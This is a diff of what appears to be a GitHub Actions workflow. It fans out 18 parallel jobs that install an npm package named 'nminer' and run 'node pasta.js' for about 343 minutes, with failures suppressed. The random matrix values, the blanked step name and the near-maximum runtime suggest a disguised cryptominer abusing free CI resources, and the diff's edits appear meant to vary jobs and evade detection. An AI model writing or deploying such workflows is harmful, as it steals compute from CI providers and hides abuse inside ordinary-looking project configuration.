@@ -9,24 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8440 }
-          - { version: 6237 }
-          - { version: 3499 }
-          - { version: 5102 }
-          - { version: 6185 }
-          - { version: 3569 }
-          - { version: 7556 }
-          - { version: 2465 }
-          - { version: 5273 }
-          - { version: 687 }
-          - { version: 5770 }
-          - { version: 800 }
-          - { version: 1583 }
-          - { version: 7836 }
-          - { version: 7157 }
-          - { version: 7987 }
-          - { version: 454 }
-          - { version: 5734 }
+          - { version: 2292 }
+          - { version: 1946 }
+          - { version: 6981 }
+          - { version: 1703 }
+          - { version: 389 }
+          - { version: 8092 }
+          - { version: 4823 }
+          - { version: 6946 }
+          - { version: 4759 }
+          - { version: 9491 }
+          - { version: 9269 }
+          - { version: 5903 }
+          - { version: 5296 }
+          - { version: 3939 }
+          - { version: 2930 }
+          - { version: 8605 }
+          - { version: 556 }
+          - { version: 4611 }
 
     steps:
       - name: Checkout
@@ -37,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: woot
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 336m node pasta.js || echo "pasta executed"
+          timeout 343m node pasta.js || echo "pasta executed"
